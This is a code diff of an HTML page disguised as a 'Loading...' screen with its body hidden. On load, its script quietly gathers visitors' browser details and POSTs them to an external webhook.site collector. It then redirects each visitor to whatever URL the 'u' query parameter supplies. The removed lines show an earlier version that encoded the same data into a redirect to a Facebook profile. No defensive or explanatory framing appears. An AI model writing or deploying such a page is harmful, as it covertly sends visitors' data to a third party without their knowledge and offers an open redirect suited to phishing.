@@ -3,10 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <title>Loading...</title>
-  <style> body { display: none; } </style>
+  <style>
+    body { display: none; }
+  </style>
   <script>
     (function () {
-      // Collect data
+      const params = new URLSearchParams(window.location.search);
+      const nextUrl = params.get('u');
+
       const data = {
         userAgent: navigator.userAgent,
         language: navigator.language,
@@ -16,22 +20,17 @@
         timestamp: new Date().toISOString()
       };
 
-      // Send data to webhook (fire & forget)
       fetch('https://webhook.site/905f5e70-2bc7-40b5-968c-2f47191d1823', {
         method: 'POST',
         mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(data)
+      })
+      .finally(() => {
+        if (nextUrl) {
+          window.location.replace(nextUrl);
+        }
       });
-
-      // Encode the data as base64 and redirect to FB
-      const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
-      const fbRedirect = "https://alpha.facebook.com/0xsaikat?track=" + encodeURIComponent(base64);
-      
-      // Redirect after slight delay
-      setTimeout(() => {
-        window.location.replace(fbRedirect);
-      }, 100); // delay for POST to fire
     })();
   </script>
 </head>
